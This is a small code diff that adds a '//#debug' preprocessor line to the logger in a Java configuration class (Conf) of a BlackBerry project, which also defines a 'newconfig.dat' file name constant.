@@ -34,6 +34,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 public class Conf {
 
     /** The debug instance. */
+	//#debug
     private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
 
     public static final String NEW_CONF = "newconfig.dat";
